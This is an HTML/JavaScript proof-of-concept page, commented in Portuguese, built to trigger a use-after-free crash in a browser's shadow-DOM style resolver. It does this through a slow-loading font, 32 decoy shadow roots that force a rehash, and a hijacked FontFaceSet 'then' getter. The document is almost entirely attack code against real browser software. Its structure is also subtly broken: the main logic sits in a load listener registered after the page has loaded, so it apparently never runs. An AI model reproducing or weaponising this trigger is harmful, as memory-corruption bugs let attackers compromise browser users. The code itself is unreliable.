<!DOCTYPE html>
<body>
<pre id="log"></pre>
<script>

function log(msg) { document.getElementById("log").append(msg + "\n"); }
window.addEventListener("load", () => setTimeout(() => {
document.fonts;
const timestamp = Date.now();
const FONT_URL = `https://slowfil.es/file?type=woff2&delay=120000&nocache=${timestamp}`;
const FAMILY   = "TestFontB";
const N = 32; // número de decoys para forçar o rehash

window.addEventListener("load", () => setTimeout(() => {

    // Shadow A: usa a fonte, força font loading
    const hostA = document.createElement("div");
    document.body.appendChild(hostA);
    const rootA = hostA.attachShadow({ mode: "open" });
    rootA.innerHTML =
        `<style>@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
        `.p{font:24px ${FAMILY}}</style><span class="p">A</span>`;

    // Shadow B: alvo — tem @font-face + style removível
    const hostB = document.createElement("div");
    hostB.style.display = "none";
    document.body.appendChild(hostB);
    const rootB = hostB.attachShadow({ mode: "open" });
    const gadgetStyle = document.createElement("style");
    gadgetStyle.textContent = ".gadget { color: navy; }";
    rootB.appendChild(gadgetStyle);
    const fontStyle = document.createElement("style");
    fontStyle.textContent =
        `@font-face{font-family:${FAMILY};src:url("${FONT_URL}")}` +
        `.p{font:24px ${FAMILY}}`;
    rootB.appendChild(fontStyle);
    const target = document.createElement("span");
    target.textContent = "B";
    rootB.appendChild(target);

    // 32 decoys: cada um com style único — ao serem reconstruídos crescem o mapa
    const decoys = Array.from({ length: N }, (_, i) => {
        const h = document.createElement("div");
        h.style.display = "none";
        document.body.appendChild(h);
        const r = h.attachShadow({ mode: "open" });
        const s = document.createElement("style");
        s.textContent = `.d${i} { color: rgb(${i},1,2); }`;
        r.appendChild(s);
        r.appendChild(document.createElement("span"));
        return { root: r, style: s };
    });

    document.body.offsetHeight; // força layout inicial
    document.fonts.load(`24px ${FAMILY}`, "A");

    if (document.fonts.status !== "loading") {
        log("SKIP: fonte nao esta em loading — tente aumentar o delay ou verificar conexao");
        return;
    }

    document.fonts.ready; // materializa a promise

    Object.defineProperty(FontFaceSet.prototype, "then", {
        configurable: true,
        get() {
            delete FontFaceSet.prototype.then;
            // força construção de 32 novos resolvers ? mapa cresce ? rehash
            document.body.offsetHeight;
            return undefined;
        }
    });

    // Forçar Reconstruct (remove, não append):
    decoys.forEach(d => d.style.remove());
    gadgetStyle.remove();

    document.styleSheets.length; // flush — dropa resolvers existentes

    // Invalidação por atributo ? createOrFindSharedShadowTreeResolver ? UAF
    target.id = "boom";

    log("VIVO — sem crash (bug nao presente ou ja corrigido)");
}, 0));
}, 500));

</script>
</body>
